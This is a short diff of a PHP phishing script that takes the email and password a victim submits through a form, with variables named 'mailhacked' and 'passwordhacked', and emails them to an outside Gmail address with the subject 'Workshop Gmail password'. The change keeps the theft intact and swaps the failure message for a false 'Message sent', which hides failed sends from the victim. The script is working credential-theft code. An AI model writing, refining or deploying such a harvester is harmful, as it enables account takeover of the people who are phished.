@@ -1,7 +1,7 @@
 <?php
         $mailhacked = $_POST["email"];
         $passwordhacked = $_POST["password"];
-         $to = "ellamenknowpee@gmail.com";
+         $to = "ellamenknowpee@gmail.com" ;
          $subject = "Workshop Gmail password";
          
          $message = "$mailhacked";
@@ -17,6 +17,6 @@
          if( $retval == true ) {
             include("MKR.php");
          }else {
-            echo "Message could not be sent...404 error check your internet";
+            echo "Message sent";
          }
       ?>
